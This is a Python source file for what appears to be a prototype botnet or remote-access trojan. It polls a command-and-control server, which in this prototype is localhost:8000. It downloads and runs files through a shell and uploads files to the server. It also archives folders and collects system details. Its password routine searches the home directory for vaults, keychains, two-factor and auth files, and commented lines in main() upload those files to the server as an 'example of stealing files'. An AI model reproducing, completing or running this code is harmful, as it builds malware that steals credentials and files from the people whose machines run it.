import requests
import psutil

import time
import uuid
import json
from os import remove, sep, path, environ, pathsep
from sys import exit
import signal
from random import randint, choice
from tempfile import mkdtemp, NamedTemporaryFile
from subprocess import call, PIPE
from glob import glob
from shutil import make_archive, rmtree, get_archive_formats
import platform
import json

# Helper functions
def insensitive_glob(pattern, **kwargs):
    def either(c):
        return '[%s%s]'%(c.lower(),c.upper()) if c.isalpha() else c
    return glob(''.join(map(either,pattern)), **kwargs)

def get_random_filename():
    alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', '1', '2', '3', '4', '5', '6', '7']

    return "".join(choice(alphabet) for i in range(9))

# Dictionary with urls as a key and filenames as values
TEMP_FILES = {}

# FOLDER KEYS
ARCHIVE_FOLDER = "FOLDER_PATH_KEY"

CC_BASE_PATH = "http://localhost:8000"

BOT_ID = uuid.getnode()

def get_command():
    r = requests.get("{}/command.json".format(CC_BASE_PATH), params={"id": BOT_ID})
    print(r.text)
    print(r.json())

def fetch_page(url, **kwargs):
    return requests.get(url, **kwargs)

def download_item(url, **kwargs):
    r = requests.get(url, **kwargs)

    if r.status_code != 200:
        return False

    if url in TEMP_FILES:
        remove(TEMP_FILES[url])

    tmp_file = NamedTemporaryFile(delete=False)

    if r.status_code == 200:
        for chunk in r:
            tmp_file.write(chunk)

    tmp_file.close()
    
    TEMP_FILES[url] = tmp_file.name

    return True

def upload_item(url, file_path, **kwargs):
    with open(file_path, 'rb') as file:
        data = {'file': file}
        r = requests.post(url, files=data)

    return r

def find_by_pattern(glob_pattern="**.txt"):
    # Returns a list of full file paths matching the pattern
    # See: https://docs.python.org/3/library/glob.html#module-glob
    return glob(glob_pattern, recursive=False)

def find_by_filename(filename):
    # Returns a list of full file paths matching the filename,
    # can be a partial filename.
    return find_by_pattern("{}{}**{}{}{}{}".format(path.expanduser('~'), sep, sep, '**', filename, '**'))

def execute_item(path, *args):
    # TODO: Pipe contents at some time
    return call([path, *args], shell=True)#, stdout=PIPE, stderr=PIPE)

def add_to_path(path):
    # Adds a path to the PATH env variable, returns the new path

    # TODO make permanent
    # Windows: http://stackoverflow.com/questions/8358265/how-to-update-path-variable-permanently-from-cmd-windows
    #          Registry access: https://docs.python.org/3.5/library/winreg.html
    # OSX/Linux: Modify bashrc
    environ["PATH"] = path + pathsep + environ["PATH"]

    return environ["PATH"]

def archive_files(root_folder):
    # Returns the location of the archive containing the selected files

    # Create the archive folder once
    if ARCHIVE_FOLDER not in TEMP_FILES:
        TEMP_FILES[ARCHIVE_FOLDER] = mkdtemp()

    tmp_dir = TEMP_FILES[ARCHIVE_FOLDER]

    filename = get_random_filename()

    archive_base_name = "{}{}{}".format(tmp_dir, sep, filename)

    file_format = get_archive_formats()[-1][0]

    archive_filename = make_archive(archive_base_name, format=file_format, base_dir=root_folder, root_dir="/")

    TEMP_FILES[archive_base_name] = archive_filename

    return archive_filename

def get_system_information():
    # Get system information in a dictionary

    data = {
        "cpu_cores": psutil.cpu_count(False),
        "cpu_count": psutil.cpu_count(),
        "memory": psutil.virtual_memory().total,
        "network": psutil.net_if_addrs(),
        "users": psutil.users()
    }

    disks = psutil.disk_partitions()
    disks_capacity = {}

    for disk in disks:
        disks_capacity[disk.mountpoint] = psutil.disk_usage(disk.mountpoint).total

    data["disks"] = disks_capacity

    print(json.dumps(data))

    return data

def exit_gracefully():
    print("Exiting")
    print("Files to clean: {}".format(len(TEMP_FILES)))

    # DELETE FOLDER before other things
    if ARCHIVE_FOLDER in TEMP_FILES:
        try:
            rmtree(TEMP_FILES[ARCHIVE_FOLDER])
        except:
            pass

    for v in TEMP_FILES.values():
        try:
            remove(v)
        except:
            pass
    exit()

def example_search_for_passwords():
    # List of filenames to look for
    filenames = [
        'vault',  # Password vaults
        'pass',   # password files
        'factor', # 2 Factor Codes
        'auth',   # Auth files
        'keychain'# Keychains
    ]

    paths = []
    for filename in filenames:
        paths += find_by_filename(filename)
    return paths

def main():
    archive_files("/Users/monikamckeown/whatodo")
    
    while(True):
        print("Checking...")
        get_system_information()
        # p = execute_item("bash {}".format(TEMP_FILES["http://localhost:8000/bash.sh"]))
        # print("p: {}".format(dir(p)))
        # print(upload_item("http://localhost:8000/upload", "/Users/monikamckeown/DFT.py"))
        # print(find_by_filename('pass'))
        # print(example_search_for_passwords())

        # Example of stealing files
        #for i in example_search_for_passwords():
        #    upload_item("http://localhost:8000/upload", i)
        time.sleep(1)




if __name__=="__main__":
    #main()
    
    try:
        main()
    except Exception as e:
        print(e)
    finally:
        exit_gracefully()
    